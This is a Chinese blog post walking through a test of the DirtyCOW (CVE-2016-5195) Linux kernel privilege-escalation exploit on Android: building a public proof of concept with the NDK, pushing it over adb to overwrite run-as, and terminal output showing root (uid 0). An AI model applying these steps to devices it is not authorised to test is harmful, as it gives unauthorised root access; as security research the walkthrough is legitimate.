---
title: DirtyCOW(CVE-2016-5195)测试
date: 2016-11-10 01:17:22
tags:
	- android
	- 安全
---

**前言**
	最近研究人员Phil Oester发现了dirtyCOW脏奶牛漏洞，影响从2007年linux2.6.22至今的所有linux内核。dirtyCOW是本地提权漏洞，具体是利用linux内存子系统在处理写时复制(copy-on-write,COW)时产生了竞争条件,使得低权限用户有机会对只读内存里的内容进行写入操作，达到提权的目的。
	众所周知，android系统也是基于linux内核，所以dirtyCOW对android设备同样适用，而且是全系android通用，因为android 1.0 内核版本是2.6.25。
	github上已经有人放出了android可用的[PoC](https://github.com/timwr/CVE-2016-5195),而谷歌11月5日发布的安全更新还没有修复这个漏洞，有兴趣测试的可以一下。

<!-- more -->

**零.编译环境**
工欲善其事，必先利其器,想让用c语言编写的dirtyCOW在android平台运行，android-ndk必不可少。
	android-ndk可以通过android-studio下载，然后把ndk所在文件夹添加到环境变量
	```
		nano .bashrc
		export NDK_HOME=/home/username/Android/Sdk/ndk-bundle
		export PATH=$PATH:$NDK_HOME
	```
username改成自己的用户名
为了让添加的立即生效
> source .bashrc



**一.代码下载**
> git clone https://github.com/timwr/CVE-2016-5195.git


**二.编译**	
> cd CVE-2016-5195
此时把设备用usb连接电脑，并打开usb调试，确保已经安装adb，如果没有，ubuntu下运行
- sudo apt-get install android-tools-adb

编译
	
> make root

接下来稍等片刻，编译脚本会自动把编译好的文件通过adb发送到设备
最后会看到终端下提示
	```
		adb push libs/armeabi/run-as /data/local/tmp/run-as
		[100%] /data/local/tmp/run-as
		adb shell 'chmod 777 /data/local/tmp/run-as'
		adb shell '/data/local/tmp/dirtycow /system/bin/run-as /data/local/tmp/run-as'
		warning: new file size (9464) and file old size (17944) differ

		size 17944


		[*] mmap 0xb51e5000
		[*] exploit (patch)
		[*] currently 0xb51e5000=464c457f
		[*] madvise = 0xb51e5000 17944
		[*] madvise = 0 1048576
		[*] /proc/self/mem 1635778560 1048576
		[*] exploited 0xb51e5000=464c457f
		adb shell /system/bin/run-as
		running as uid 2000
		uid 0
	```
运行run-as时的uid为0,已经达到提权的目的，测试完毕。

**总结：**
dirtyCOW确实可以达到提权的目的，但是通过这个漏洞只能覆盖掉系统里已有的文件，并不能直接添加文件，也就是说单纯通过这一个漏洞达到root手机的目的有些困难。xda论坛已经有人通过这个漏洞在已经解锁的设备上刷入了第三方recovery，但是这种方法风险太大，有可能变砖，好在11月安全更新并没有修复dirtyCOW，至少还有一个月时间让各路大神探索其他风险更小的root途径。